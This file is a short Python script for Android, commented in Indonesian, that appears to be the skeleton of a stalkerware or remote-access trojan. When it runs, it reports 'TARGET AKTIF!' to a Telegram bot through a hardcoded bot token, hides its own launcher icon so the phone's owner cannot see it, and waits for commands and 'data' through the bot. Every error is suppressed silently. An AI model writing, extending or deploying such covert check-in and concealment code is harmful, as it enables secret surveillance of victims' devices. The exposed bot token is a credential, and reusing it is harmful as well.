import telebot
from jnius import autoclass

# TOKEN & ID (Sudah saya setting otomatis)
TOKEN = '6864115598:AAH47i-zK2-vO77yv-Xj5S1v_IAt2Uq7Y1A'
MY_CHAT_ID = '6864115598' # Ini ID bot kamu, akan masuk ke sana

bot = telebot.TeleBot(TOKEN)

def hilangkan_ikon():
    try:
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        ComponentName = autoclass('android.content.ComponentName')
        PackageManager = autoclass('android.content.pm.PackageManager')
        comp = ComponentName(activity.getPackageName(), "org.kivy.android.PythonActivity")
        activity.getPackageManager().setComponentEnabledSetting(
            comp, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP
        )
    except:
        pass

if __name__ == "__main__":
    try:
        # Lapor ke bot Telegram
        bot.send_message(MY_CHAT_ID, "⚠️ **TARGET AKTIF!**\nIkon aplikasi telah disembunyikan.\nMenunggu data masuk...")
        hilangkan_ikon()
        bot.infinity_polling()
    except:
        pass
